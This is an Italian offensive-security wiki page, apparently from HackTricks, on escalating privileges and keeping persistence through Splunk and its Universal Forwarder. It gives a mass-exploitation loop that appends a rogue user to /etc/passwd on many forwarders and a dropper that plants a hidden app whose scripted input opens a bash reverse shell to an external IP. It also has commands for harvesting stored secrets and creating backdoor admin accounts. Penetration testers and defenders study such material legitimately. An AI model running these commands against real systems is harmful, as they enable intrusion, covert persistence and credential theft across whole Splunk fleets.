# Splunk LPE and Persistence

Se durante l’**enumerazione** di una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (solitamente **8000** per la web UI e **8089** per la management API), credenziali valide possono spesso essere trasformate in **code execution** tramite l’installazione di app, gli scripted inputs o le management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Se Splunk è in esecuzione come **root**, questo si traduce frequentemente in un’immediata **privilege escalation**.<sup>[[1]](#references)</sup>

Se ti serve solo la superficie di attacco remota generica, l’enumerazione o il percorso di app-upload RCE, consulta:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se sei **già root** e il servizio Splunk non è in ascolto solo su localhost, puoi anche sottrarre gli **hash delle password di Splunk**, recuperare **segreti cifrati** o distribuire una **malicious app** per mantenere la persistence localmente o su più forwarder.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

Quando ottieni accesso a un host che esegue Splunk o Splunk Universal Forwarder, questi sono solitamente i percorsi più interessanti:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatti importanti:

- **`$SPLUNK_HOME/etc/passwd`**: utenti locali Splunk e hash delle password.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chiave utilizzata da Splunk per crittografare i secret memorizzati in diversi file `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: file iniziale di bootstrap dell'amministratore; utile nelle gold image e in caso di errori di provisioning. Viene ignorato se `etc/passwd` esiste già.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: posizione in cui gli scripted inputs vengono comunemente abilitati.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buoni punti in cui nascondere un'app persistente o verificare cosa viene già distribuito.<sup>[[11]](#references)</sup>

## Riepilogo dell'exploit dell'agente Splunk Universal Forwarder

Per ulteriori dettagli, consulta [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un riepilogo.<sup>[[1]](#references)</sup>

**Panoramica dell'exploit:**
Un exploit che prende di mira Splunk Universal Forwarder (UF) consente agli attaccanti in possesso della **password dell'agente** di eseguire codice arbitrario sui sistemi che eseguono l'agente, compromettendo potenzialmente una parte significativa dell'ambiente.<sup>[[1]](#references)</sup>

**Perché funziona:**

- Il servizio di gestione dell'UF è comunemente esposto sulla porta **TCP 8089**.<sup>[[6]](#references)</sup>
- Gli attaccanti possono autenticarsi all'API e ordinare al forwarder di installare un **app bundle malevolo**.<sup>[[1]](#references)[[5]](#references)</sup>
- La stessa primitive può essere utilizzata localmente per ottenere **LPE** o da remoto per ottenere **RCE**.<sup>[[5]](#references)</sup>
- Tool pubblici come **SplunkWhisperer2** creano automaticamente l'app bundle e possono adattare i payload per i target Linux.<sup>[[5]](#references)</sup>

**Modi comuni per recuperare la password:**

- Credenziali in chiaro presenti in documentazione, script, share o nell'automazione del deployment.<sup>[[1]](#references)</sup>
- Hash delle password all'interno di `$SPLUNK_HOME/etc/passwd`, seguiti dal cracking offline.<sup>[[1]](#references)[[7]](#references)</sup>
- Gold image o residui del provisioning, come `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impatto:**

- Esecuzione di codice con privilegi SYSTEM/root su ogni host compromesso.<sup>[[1]](#references)</sup>
- Deployment di app persistenti, backdoor o ransomware.<sup>[[1]](#references)</sup>
- Disabilitazione o manomissione della telemetria prima che i dati vengano inoltrati.<sup>[[1]](#references)</sup>

**Comando di esempio per l'exploitation:**

Il report originale mostra il seguente loop per inviare un payload a più forwarder.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit pubblici utilizzabili:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistenza tramite Scripted Inputs o App malevole

Se disponi di **accesso in scrittura al filesystem** come `root`/`splunk`, oppure di accesso autenticato per installare app, un meccanismo di persistenza molto affidabile consiste nel distribuire una **custom app** con un **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> La documentazione di Splunk prevede che gli scripted inputs risiedano nella directory di un'app e siano abilitati tramite `inputs.conf`.<sup>[[10]](#references)</sup>

Layout tipico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` minimale:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper (utilizzando quel layout dell'app documentato):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Note:

- Lo stesso trucco funziona su **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Gli attacker spesso si confondono modificando un add-on legittimo invece di creare un'app evidentemente malevola.<sup>[[2]](#references)</sup>
- Su un **deployment server**, piantare un'app malevola all'interno di `deployment-apps/` si trasforma in **persistence sull'intera flotta**, perché i forwarder interrogano periodicamente il server, scaricano le app aggiornate e spesso si riavviano per applicarle.<sup>[[11]](#references)[[12]](#references)</sup>

## Furto di credenziali e takeover dell'admin

Se puoi leggere i file locali di Splunk, di solito ci sono due obiettivi validi: recuperare l'accesso **admin a Splunk** e recuperare le **credenziali dei servizi cifrate**.<sup>[[8]](#references)</sup>

### Hash delle password e utenti locali

Splunk memorizza i dati di autenticazione locali in `etc/passwd`. A seconda del deployment, il cracking di quel file può consentire di recuperare credenziali funzionanti per la web UI e la management API.<sup>[[1]](#references)[[7]](#references)</sup>

Se disponi già di credenziali **admin** valide e Splunk utilizza il backend di autenticazione **native**, la CLI stessa può essere usata per la persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valori crittografati

Splunk usa `etc/auth/splunk.secret` per proteggere i valori sensibili memorizzati in diversi file di configurazione. Se riesci a sottrarre sia il **secret** sia i file **`.conf`** rilevanti, spesso puoi recuperare o riutilizzare:<sup>[[8]](#references)</sup>

- shared secret di forwarder/indexer come `pass4SymmKey`
- password delle private key TLS come `sslPassword`
- credenziali di bind LDAP come `bindDNPassword`

Questo può supportare il **lateral movement** anche quando la password dell'amministratore Splunk non è crackabile.<sup>[[8]](#references)</sup>

### Abuso di `user-seed.conf`

`user-seed.conf` viene utilizzato solo durante il primo avvio o quando `etc/passwd` non esiste. Questo lo rende meno utile su un sistema live, ma molto interessante in:<sup>[[9]](#references)</sup>

- template di installazione compromessi
- container image
- workflow di provisioning non presidiati
- appliance in cui Splunk viene automaticamente reinizializzato

In questi casi, inserire un `HASHED_PASSWORD` generato con `splunk hash-passwd` offre un modo discreto per recuperare l'accesso admin dopo il redeployment.<sup>[[9]](#references)</sup>

## Abuso delle query Splunk

Per ulteriori dettagli consulta [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Una tecnica recente consiste nell'abusare di **XSLT fornito dall'utente** nelle versioni vulnerabili di Splunk Enterprise per trasformare un account autenticato con privilegi ridotti in **esecuzione di comandi OS** come utente `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Flusso di alto livello:<sup>[[3]](#references)[[4]](#references)</sup>

1. Autenticati a Splunk.
2. Carica un file **XSL** malevolo attraverso la funzionalità di anteprima/upload.
3. Fai in modo che Splunk esegua il rendering dei risultati della ricerca con quel foglio di stile caricato dalla directory **dispatch**.
4. Usa il payload XSLT per scrivere un file o attivare l'esecuzione attraverso la search pipeline di Splunk, ad esempio raggiungendo funzionalità interne come `runshellscript`.

L'aspetto offensivo importante è che questo percorso consente una **RCE post-auth senza richiedere app upload**. Su Linux, di solito si ottiene una sessione con l'account **`splunk`**, che resta comunque preziosa perché spesso questo utente è proprietario dell'albero dell'applicazione, può leggere i secret e può inserire app persistenti che sopravvivono alla perdita della shell.<sup>[[3]](#references)[[4]](#references)</sup>

Un percorso rappresentativo utilizzato durante l'exploitation è:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se Splunk viene eseguito con troppi privilegi, oppure se l'utente `splunk` ha accesso a script pericolosi, service unit scrivibili o regole `sudo` non sicure, questo diventa una catena **LPE** pulita.

## References

- [1] [Abusare dei Forwarder Splunk per RCE e Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Attenzione a TraitorWare: usare Splunk per Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Security Advisory di Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analisi di CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Modificare i valori predefiniti](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Distribuire password sicure su più server](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Configurare un scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Creare deployment app](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Come avvengono gli aggiornamenti del deployment](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Configurare gli utenti con la CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
